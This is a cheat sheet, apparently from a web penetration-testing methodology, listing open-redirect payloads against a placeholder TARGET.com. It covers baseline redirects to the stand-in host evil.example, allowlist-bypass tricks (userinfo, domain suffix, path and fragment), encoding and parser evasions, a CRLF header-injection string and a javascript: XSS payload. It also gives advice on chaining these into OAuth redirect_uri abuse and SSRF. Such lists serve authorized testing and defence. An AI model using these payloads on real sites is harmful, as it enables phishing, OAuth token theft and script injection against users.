# Open redirect payloads + allowlist bypasses (step 3)
# Point the destination at YOUR benign/OOB host. Record in redirect_tests.jsonl:
# {param, payload, mechanism, landed_host, external, bypassed_allowlist}.
# Replace evil.example with your controlled host.

## Baseline
```
https://evil.example
//evil.example                 # scheme-relative (no https:)
/\evil.example
https:/evil.example
https:evil.example
```

## Allowlist bypasses (when the app checks for its own domain)
```
https://TARGET.com.evil.example           # post-domain: suffix looks like TARGET.com
https://evil.example/TARGET.com           # TARGET.com in path, not host
https://evil.example#TARGET.com
https://evil.example?TARGET.com
https://TARGET.com@evil.example           # userinfo — real host is evil.example
https://evil.example\@TARGET.com
//TARGET.com@evil.example
https://TARGET.com.evil.example/
http://TARGET.com                         # scheme downgrade if only https checked
```

## Encoding / parser tricks
```
%2f%2fevil.example                        # encoded //
%5cevil.example                           # \
https://evil%E3%80%82example              # unicode ideographic full stop as dot
/%09/evil.example                         # tab
https://evil.example%2f%2e%2e
```

## CRLF (if the param flows into the Location header unsanitized → header injection)
```
/%0d%0aLocation:https://evil.example
```

## Client-side (JS location sink) → also XSS primitive
```
javascript:alert(document.domain)
```

Identify the mechanism (server 3xx vs JS `location` vs `meta refresh`), find the lowest payload that
lands on your external host, and note any chain (OAuth `redirect_uri`, SSRF, `javascript:`→XSS).
